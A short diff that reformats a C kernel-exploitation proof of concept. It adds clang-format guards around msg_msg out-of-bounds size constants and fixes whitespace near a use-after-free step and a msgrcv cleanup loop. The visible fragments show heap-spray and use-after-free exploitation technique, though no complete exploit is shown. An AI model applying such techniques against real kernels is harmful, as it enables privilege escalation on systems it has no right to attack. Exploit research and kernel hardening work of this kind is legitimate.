@@ -94,11 +94,13 @@ int act(int act_fd, int code, int n, char *args)
 #define OBJS_PER_SLAB 42
 #define CPU_PARTIAL 120
 
+/* clang-format off */
 #define MSG_NORM_SIZE	DRILL_ITEM_SIZE - 48
 #define MSG_NORM_TYPE	5
 #define MSG_OOB_SIZE	0x2000
 #define BUF_OOB_SIZE	MSG_OOB_SIZE + 0x100
 #define MSG_OOB_TYPE	0xc001
+/* clang-format on */
 
 unsigned long *msgrcv_buf = NULL;
 int msqid = -1;
@@ -207,7 +209,7 @@ int main(void)
 	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);
 
 	printf("[!] obtain dangling reference from use-after-free bug\n");
- 	uaf_n = current_n - 1;
+	uaf_n = current_n - 1;
 	printf("[+] done, uaf_n: %ld\n", uaf_n);
 
 	printf("[!] create new active slab, allocate objs_per_slab objects\n");
@@ -306,7 +308,7 @@ int main(void)
 	result = EXIT_SUCCESS;
 
 end:
-	for (i = 0; ; i++) {
+	for (i = 0;; i++) {
 		bytes = msgrcv(msqid, msgrcv_buf, MSG_OOB_SIZE, MSG_NORM_TYPE, IPC_NOWAIT);
 		if (bytes == -1)
 			break;
